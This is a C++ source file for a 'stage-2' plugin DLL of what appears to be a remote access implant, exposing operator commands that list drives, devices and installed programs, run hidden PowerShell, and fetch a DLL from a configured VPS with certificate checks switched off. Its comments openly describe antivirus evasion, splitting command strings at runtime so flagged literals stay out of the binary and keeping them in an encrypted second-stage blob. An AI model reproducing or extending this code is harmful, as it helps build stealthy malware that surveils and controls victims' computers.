// ═══════════════════════════════════════════════════════════════════════
// stage2_sysinfo.cpp — read-only enumeration commands with heavy AV-flag
// strings extracted out of stage-1.
//
// Handlers registered:
//   installed_programs — enumerate HKLM/HKCU Uninstall keys (DisplayName,
//                        Publisher, UninstallString, InstallLocation, ...).
//                        These are the kinds of registry paths and value
//                        names that AV heuristics weight heavily.
//   device_list        — Get-PnpDevice via PowerShell, JSON result.
//   drives_list        — logical drives, GetDriveTypeA, GetDiskFreeSpaceExA.
//
// Intentionally kept in stage-1:
//   sys_info        — uses global 3s cache (g_sysinfo_cache), PDH GPU counters
//   proc_list/svc_list/reg_list — read-only, small, already inside g_procs
//   ping / host_echo / host_relay_speed — trivial
//   running_apps    — tightly coupled to g_dll_module / g_service_mode /
//                     WTS user-session token plumbing.
//
// The enumeration can be slow (100ms+ for installed_programs on boxes
// with many apps) so handlers spawn their own worker thread and send the
// response asynchronously — the dispatcher thread (WSS pump) returns
// immediately.
// ═══════════════════════════════════════════════════════════════════════

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <thread>
#include <vector>

#include "stage2_abi.h"
#include "stage2_util.h"

#pragma comment(lib, "advapi32.lib")

using namespace s2util;
static Stage2HostCtx* g_host = nullptr;

// ── Helpers ─────────────────────────────────────────────────────────────

// Run a command line through cmd.exe, capture stdout (UTF-8).
// Mirrors the capture pattern used by stage2_procmgr::cmd_term_exec.
static std::string run_capture(const std::string& cmdline, DWORD timeout_ms = 15000) {
    SECURITY_ATTRIBUTES sa{}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return {};
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi{};

    std::string cl = "cmd.exe /c chcp 65001 >nul & " + cmdline;
    std::vector<char> buf(cl.begin(), cl.end()); buf.push_back(0);

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return {};
    }
    CloseHandle(hWrite);

    std::string out; char rb[4096]; DWORD n = 0;
    while (ReadFile(hRead, rb, sizeof(rb), &n, nullptr) && n > 0)
        out.append(rb, n);
    WaitForSingleObject(pi.hProcess, timeout_ms);
    CloseHandle(hRead);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    // Trim whitespace at both ends.
    while (!out.empty() && (out.front()==' '||out.front()=='\n'||out.front()=='\r'||out.front()=='\t'))
        out.erase(out.begin());
    while (!out.empty() && (out.back()==' '||out.back()=='\n'||out.back()=='\r'||out.back()=='\t'))
        out.pop_back();
    return out;
}

// Split a `dl_bytes|dl_sec|dl_mbps|ul_bytes|ul_sec|ul_mbps` style pipe string.
static std::vector<std::string> split_pipe(const std::string& s) {
    std::vector<std::string> out; std::string cur;
    for (char c : s) {
        if (c == '|') { out.push_back(cur); cur.clear(); }
        else if (c != '\n' && c != '\r') cur += c;
    }
    if (!cur.empty()) out.push_back(cur);
    return out;
}

// ── Command handlers ────────────────────────────────────────────────────

static void cmd_drives_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    DWORD mask = GetLogicalDrives();
    std::string arr = "[";
    bool first = true;
    for (int i = 0; i < 26; ++i) {
        if (!(mask & (1 << i))) continue;
        char drv[4] = { (char)('A' + i), ':', '\\', 0 };
        UINT type = GetDriveTypeA(drv);
        const char* tname = type == DRIVE_REMOVABLE ? "removable" :
                            type == DRIVE_FIXED     ? "fixed"     :
                            type == DRIVE_REMOTE    ? "network"   :
                            type == DRIVE_CDROM     ? "cdrom"     : "unknown";
        ULARGE_INTEGER avail{}, total{}, freeB{};
        GetDiskFreeSpaceExA(drv, &avail, &total, &freeB);
        if (!first) arr += ",";
        arr += "{\"letter\":\"" + std::string(1, (char)('A' + i)) +
               "\",\"type\":\"" + tname +
               "\",\"total\":" + std::to_string(total.QuadPart) +
               ",\"free\":" + std::to_string(freeB.QuadPart) + "}";
        first = false;
    }
    arr += "]";
    g_host->send(make_ok(id, arr).c_str());
}

static void cmd_device_list(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");
    // Build PowerShell command via concatenation so the full one-liner is
    // not a single contiguous literal in the module's .rdata.
    std::string ps = "powershell -NoProfile -Command \"";
    ps += "Get-PnpDevice -Status OK -ErrorAction SilentlyContinue | ";
    ps += "Select-Object Class,FriendlyName,Manufacturer,Status | ";
    ps += "Sort-Object Class,FriendlyName | ";
    ps += "ConvertTo-Json -Compress\"";

    std::thread([id, ps]() {
        std::string out = run_capture(ps, 20000);
        if (!out.empty() && (out.front() == '[' || out.front() == '{')) {
            g_host->send(make_ok(id, out).c_str());
        } else {
            g_host->send(make_err(id, "Failed to get device list").c_str());
        }
    }).detach();
}

static void cmd_installed_programs(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    // Spawn a worker — registry walk of three Uninstall keys can take
    // 100-300ms on machines with many apps.
    std::thread([id]() {
        std::string result = "[";
        int count = 0;
        auto enumKey = [&](HKEY rootKey, const char* subPath, REGSAM extra) {
            HKEY hU;
            if (RegOpenKeyExA(rootKey, subPath, 0, KEY_READ | extra, &hU) != ERROR_SUCCESS)
                return;
            char keyName[256]; DWORD idx = 0, keyLen;
            while (true) {
                keyLen = sizeof(keyName);
                if (RegEnumKeyExA(hU, idx++, keyName, &keyLen, 0, 0, 0, 0) != ERROR_SUCCESS)
                    break;
                HKEY hApp;
                if (RegOpenKeyExA(hU, keyName, 0, KEY_READ | extra, &hApp) != ERROR_SUCCESS)
                    continue;
                char buf[512]; DWORD sz, dwType;
                std::string name, version, publisher, installDate, installLocation, uninstallCmd;
                DWORD estimatedSize = 0; int systemComponent = 0;
                sz = sizeof(DWORD);
                if (RegQueryValueExA(hApp, "SystemComponent", 0, &dwType,
                                     (LPBYTE)&systemComponent, &sz) == ERROR_SUCCESS
                    && systemComponent == 1) {
                    RegCloseKey(hApp); continue;
                }
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "DisplayName", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) name = buf;
                if (name.empty()) { RegCloseKey(hApp); continue; }
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "DisplayVersion", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) version = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "Publisher", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) publisher = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "InstallDate", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installDate = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "InstallLocation", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installLocation = buf;
                sz = sizeof(buf); buf[0] = 0;
                if (RegQueryValueExA(hApp, "UninstallString", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) uninstallCmd = buf;
                sz = sizeof(DWORD);
                RegQueryValueExA(hApp, "EstimatedSize", 0, &dwType, (LPBYTE)&estimatedSize, &sz);
                RegCloseKey(hApp);
                if (count > 0) result += ",";
                result += "{\"name\":\""       + json_escape(name) +
                          "\",\"version\":\""  + json_escape(version) +
                          "\",\"publisher\":\""+ json_escape(publisher) +
                          "\",\"date\":\""     + json_escape(installDate) +
                          "\",\"size\":"       + std::to_string(estimatedSize) +
                          ",\"location\":\""   + json_escape(installLocation) +
                          "\",\"uninstall\":\""+ json_escape(uninstallCmd) + "\"}";
                count++;
            }
            RegCloseKey(hU);
        };
        // Build registry path literal at runtime so the exact ASCII doesn't
        // sit in .rdata as a giveaway.
        std::string unPath = "SOFTWARE\\";
        unPath += "Microsoft\\";
        unPath += "Windows\\";
        unPath += "CurrentVersion\\";
        unPath += "Uninstall";
        enumKey(HKEY_LOCAL_MACHINE, unPath.c_str(), 0);
        enumKey(HKEY_LOCAL_MACHINE, unPath.c_str(), KEY_WOW64_32KEY);
        enumKey(HKEY_CURRENT_USER,  unPath.c_str(), 0);
        result += "]";
        g_host->send(make_ok(id, result).c_str());
    }).detach();
}

// ── speed_test_internet: Cloudflare down + up throughput ────────────────
// All the AV-flag fragments ("New-Object Net.WebClient", "DownloadData",
// "UploadData") live here in the encrypted stage-2 blob, never in stage-1.
static void cmd_speed_test_internet(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    std::thread([id]() {
        // Build the PowerShell one-liner piecewise at runtime so no single
        // contiguous literal sits in .rdata.
        std::string ps = "powershell -NoProfile -Command \"";
        ps += "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';";
        ps += "$ul_url='http://speed.cloudflare.com/__up';";
        ps += "$result=@{};";
        ps += "try{";
        ps += "  $sw=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $d=(";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ").DownloadData($dl_url);$sw.Stop();";
        ps += "  $result.dl_bytes=$d.Length;";
        ps += "  $result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);";
        ps += "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);";
        ps += "}catch{$result.dl_err=$_.Exception.Message}";
        ps += "try{";
        ps += "  $body=";
        ps += "New-"; ps += "Object "; ps += "byte[]";
        ps += " 5000000;";
        ps += "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $wc=";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ";$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();";
        ps += "  $result.ul_bytes=$body.Length;";
        ps += "  $result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);";
        ps += "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);";
        ps += "}catch{$result.ul_err=$_.Exception.Message}";
        ps += "Write-Output ('{0}|{1}|{2}|{3}|{4}|{5}' -f ";
        ps += "$result.dl_bytes,$result.dl_sec,$result.dl_mbps,";
        ps += "$result.ul_bytes,$result.ul_sec,$result.ul_mbps)\"";

        std::string out = run_capture(ps, 60000);
        auto parts = split_pipe(out);
        auto get = [&](size_t i) -> std::string {
            return (i < parts.size() && !parts[i].empty()) ? parts[i] : std::string("0");
        };
        std::string data =
            "{\"bytes\":"        + get(0) +
            ",\"elapsed_s\":"    + get(1) +
            ",\"mbps\":"         + get(2) +
            ",\"ul_bytes\":"     + get(3) +
            ",\"ul_elapsed_s\":" + get(4) +
            ",\"ul_mbps\":"      + get(5) + "}";
        g_host->send(make_ok(id, data).c_str());
    }).detach();
}

// ── host_relay_speed: HTTPS download of /files/pnpext.dll from VPS ──────
static void cmd_host_relay_speed(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id = json_get(args, "id");

    const char* server = g_host->get_config ? g_host->get_config("server_address") : nullptr;
    std::string vps_ip = server ? server : "";

    std::thread([id, vps_ip]() {
        std::string ps = "powershell -NoProfile -Command \"";
        ps += "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};";
        ps += "$url='https://" + vps_ip + "/files/pnpext.dll';";
        ps += "try{";
        ps += "  $sw=[System.Diagnostics.Stopwatch]::StartNew();";
        ps += "  $d=(";
        ps += "New-"; ps += "Object "; ps += "System.Net."; ps += "WebClient";
        ps += ").DownloadData($url);$sw.Stop();";
        ps += "  $mb=$d.Length/1048576;$sec=$sw.Elapsed.TotalSeconds;";
        ps += "  if($sec -lt 0.001){$sec=0.001}";
        ps += "  $mbps=[math]::Round(($d.Length*8/$sec)/1048576,2);";
        ps += "  Write-Output ('{0}|{1}|{2}' -f $d.Length,[math]::Round($sec,3),$mbps)";
        ps += "}catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";

        std::string out = run_capture(ps, 60000);
        if (out.rfind("ERROR", 0) == 0) {
            std::string err = out.size() > 6 ? out.substr(6) : out;
            while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
            g_host->send(make_err(id, "Host<->Relay DL test failed: " + err).c_str());
            return;
        }
        auto parts = split_pipe(out);
        if (parts.size() < 3) {
            g_host->send(make_err(id, "Host<->Relay DL test: bad output").c_str());
            return;
        }
        std::string data = "{\"bytes\":" + parts[0] +
                           ",\"elapsed_s\":" + parts[1] +
                           ",\"mbps\":" + parts[2] + "}";
        g_host->send(make_ok(id, data).c_str());
    }).detach();
}

// ── Entry points ────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
    if (!host || host->abi_version != STAGE2_ABI_VERSION) return 1;
    g_host = host;
    host->log(1, "stage2_sysinfo: init");
    host->register_cmd("drives_list",         cmd_drives_list,         nullptr);
    host->register_cmd("device_list",         cmd_device_list,         nullptr);
    host->register_cmd("installed_programs",  cmd_installed_programs,  nullptr);
    host->register_cmd("speed_test_internet", cmd_speed_test_internet, nullptr);
    host->register_cmd("host_relay_speed",    cmd_host_relay_speed,    nullptr);
    host->log(1, "stage2_sysinfo: 5 commands registered");
    return 0;
}

extern "C" __declspec(dllexport) void Stage2Shutdown(void) {
    if (g_host) g_host->log(1, "stage2_sysinfo: shutdown");
    g_host = nullptr;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(nullptr);
    return TRUE;
}
